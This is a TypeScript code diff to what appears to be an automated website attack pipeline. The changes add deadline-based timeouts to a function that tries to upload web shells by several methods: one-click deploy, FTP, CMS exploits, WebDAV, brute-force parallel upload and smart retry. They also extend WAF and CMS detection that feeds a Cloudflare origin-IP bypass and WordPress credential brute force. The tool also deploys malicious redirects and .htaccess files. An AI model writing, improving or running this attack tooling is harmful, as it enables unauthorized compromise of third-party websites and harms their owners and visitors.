@@ -467,12 +467,19 @@ async function uploadShellWithAllMethods(
   vulnScan: VulnScanResult | null,
   config: PipelineConfig,
   onEvent: EventCallback,
+  deadline?: number,
 ): Promise<{ success: boolean; url: string; method: string }> {
   const fileContent = typeof shell.content === "string" ? shell.content : shell.content.toString("base64");
-  const timeout = config.timeoutPerMethod || 30000;
+  const baseTimeout = config.timeoutPerMethod || 30000;
   const enabledMethods = getEnabledMethods(config);
   const effectiveRedirectUrl = selectRedirectUrl(config);
   const proxyUrl = selectProxy(config);
+  // Dynamic timeout: use remaining time until deadline, capped at base timeout
+  const getRemainingMs = () => deadline ? Math.max(deadline - Date.now(), 5000) : Infinity;
+  const getMethodTimeout = () => Math.min(baseTimeout, getRemainingMs() / 3); // leave room for other methods
+  const timeout = getMethodTimeout(); // initial timeout for method 1
+  // Helper: check if we've exceeded the pipeline deadline
+  const isExpired = () => deadline ? Date.now() > deadline : false;
 
   onEvent({
     phase: "upload",
@@ -513,7 +520,7 @@ async function uploadShellWithAllMethods(
 
     const result: DeployResult = await Promise.race([
       oneClickDeploy(targetUrl, config.redirectUrl, deployOpts),
-      new Promise<DeployResult>((_, reject) => setTimeout(() => reject(new Error("oneClickDeploy timeout")), timeout + 15000)),
+      new Promise<DeployResult>((_, reject) => setTimeout(() => reject(new Error("oneClickDeploy timeout")), Math.min(timeout + 15000, getRemainingMs()))),
     ]);
 
     const shellUrl = result.shellInfo?.url || result.deployedFiles?.find(f => f.status === "deployed" && f.url)?.url;
@@ -539,6 +546,7 @@ async function uploadShellWithAllMethods(
   } // end oneclick block
 
   // Method 2: tryAllUploadMethods (FTP, CMS exploits, WebDAV, API endpoints)
+  if (isExpired()) return { success: false, url: "", method: "deadline_expired" };
   if (prescreen && (enabledMethods.includes("try_all") || enabledMethods.length === 0)) {
     onEvent({
       phase: "upload",
@@ -564,7 +572,7 @@ async function uploadShellWithAllMethods(
             });
           },
         ),
-        new Promise<UploadAttemptResult[]>((_, reject) => setTimeout(() => reject(new Error("tryAllUploadMethods timeout")), timeout + 30000)),
+        new Promise<UploadAttemptResult[]>((_, reject) => setTimeout(() => reject(new Error("tryAllUploadMethods timeout")), Math.min(timeout + 30000, getRemainingMs()))),
       ]);
 
       const successResult = results.find(r => r.success && r.fileUrl);
@@ -588,6 +596,7 @@ async function uploadShellWithAllMethods(
   }
 
   // Method 3: multiVectorParallelUpload (brute force parallel)
+  if (isExpired()) return { success: false, url: "", method: "deadline_expired" };
   if (!enabledMethods.includes("parallel") && enabledMethods.length > 0) {
     // Skip
   } else {
@@ -627,7 +636,7 @@ async function uploadShellWithAllMethods(
 
     const result = await Promise.race([
       multiVectorParallelUpload(parallelConfig),
-      new Promise<any>((_, reject) => setTimeout(() => reject(new Error("parallel upload timeout")), timeout + 30000)),
+      new Promise<any>((_, reject) => setTimeout(() => reject(new Error("parallel upload timeout")), Math.min(timeout + 30000, getRemainingMs()))),
     ]);
 
     if (result.success && result.bestResult?.fileUrl) {
@@ -650,6 +659,7 @@ async function uploadShellWithAllMethods(
   } // end parallel block
 
   // Method 4: smartRetryUpload (adaptive retry with increasing timeouts)
+  if (isExpired()) return { success: false, url: "", method: "deadline_expired" };
   if (!enabledMethods.includes("smart_retry") && enabledMethods.length > 0) {
     // Skip
   } else {
@@ -688,7 +698,7 @@ async function uploadShellWithAllMethods(
 
     const result = await Promise.race([
       smartRetryUpload(retryConfig, 3),
-      new Promise<any>((_, reject) => setTimeout(() => reject(new Error("smart retry timeout")), (timeout + 10000) * 3 + 30000)),
+      new Promise<any>((_, reject) => setTimeout(() => reject(new Error("smart retry timeout")), Math.min((timeout + 10000) * 3 + 30000, getRemainingMs()))),
     ]);
 
     if (result.success && result.bestResult?.fileUrl) {
@@ -1046,7 +1056,7 @@ export async function runUnifiedAttackPipeline(
 
   // ─── Phase 2.5c: Cloudflare Origin IP Bypass (Advanced) ───
   let cfBypassResult: OriginIPResult | null = null;
-  const wafDetected = prescreen?.wafDetected || aiTargetAnalysis?.security?.wafDetected || "";
+  const wafDetected = prescreen?.wafDetected || aiTargetAnalysis?.security?.wafDetected || vulnScan?.serverInfo?.waf || vulnScan?.serverInfo?.cdn || "";
   const isCloudflare = wafDetected.toLowerCase().includes("cloudflare");
   
   if (isCloudflare && !shouldStop('cf_bypass')) {
@@ -1102,7 +1112,7 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 2.5d: WP Brute Force (if WordPress detected) ───
   let wpBruteForceResult: BruteForceResult | null = null;
   let wpAuthCredentials: WPCredentials | null = null;
-  const detectedCms = (prescreen?.cms || aiTargetAnalysis?.techStack?.cms || "").toLowerCase();
+  const detectedCms = (prescreen?.cms || aiTargetAnalysis?.techStack?.cms || vulnScan?.cms?.type || "").toLowerCase();
   const isWordPress = detectedCms.includes("wordpress") || detectedCms === "wp";
 
   if (isWordPress && !shouldStop('wp_brute_force') && !hasSuccessfulRedirect()) {
@@ -1362,6 +1372,7 @@ export async function runUnifiedAttackPipeline(
         vulnScan,
         config,
         onEvent,
+        deadline,
       );
 
       if (uploadResult.success && uploadResult.url) {
@@ -1439,6 +1450,7 @@ export async function runUnifiedAttackPipeline(
               vulnScan,
               config,
               onEvent,
+              deadline,
             );
 
             if (htmlUploadResult.success && htmlUploadResult.url) {
@@ -1478,6 +1490,7 @@ export async function runUnifiedAttackPipeline(
               vulnScan,
               config,
               onEvent,
+              deadline,
             );
 
             if (htaccessUploadResult.success && htaccessUploadResult.url) {
